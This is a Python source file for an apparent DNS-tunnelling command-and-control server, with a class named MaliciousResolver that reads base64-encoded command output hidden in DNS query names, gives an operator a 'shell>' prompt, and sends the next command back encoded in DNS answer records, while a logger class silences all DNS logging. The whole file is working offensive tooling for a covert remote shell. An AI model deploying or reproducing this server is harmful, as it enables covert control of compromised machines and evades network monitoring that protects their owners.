import dnslib
import dnslib.server
import base64
import socket
from sys import exit
from dotenv import dotenv_values

config = dotenv_values()

class MaliciousResolver:
    def resolve(self, request, handler):

        hostname = socket.gethostname()
        my_ip_addr = socket.gethostbyname(hostname)

        qname = str(request.questions[0].qname)
        qname = qname.split(".")
        request_msg = qname[0] 
        command_results = base64.b64decode(request_msg).decode("ascii")
        
        print(command_results, end='')

        if command_results.endswith("\n"):
            cmd = input("shell> ")
            cmd = cmd.encode("ascii")
        else:
            cmd = "continue"
            cmd = cmd.encode("ascii")

        b64inputcmd = base64.b64encode(cmd).decode("ascii")

        reply = request.reply()
        reply.add_answer(dnslib.RR(rname=b64inputcmd + "." + config["DOMAIN_NAME"], rtype=dnslib.QTYPE.A, rdata=dnslib.A(my_ip_addr), ttl=10))
        return reply

class SilentDNSLogger(dnslib.server.DNSLogger):
    def log_recv(self, handler, data):
        pass

    def log_send(self, handler, data):
        pass
    
    def log_request(self, handler, request):
        pass

    def log_reply(self, handler, reply):
        pass

if __name__ == "__main__":
    resolver = MaliciousResolver()
    server = dnslib.server.DNSServer(resolver=resolver, port=int(config["DNSSERVER_CONTAINER_PORT"]), address=config["DNSSERVER_CONTAINER_ADDRESS_LISTEN"], tcp=False, logger=SilentDNSLogger())

    try:
        server.start()
    except KeyboardInterrupt:
        print("\nDetected CTRL+C. Exiting now.")
        exit(0)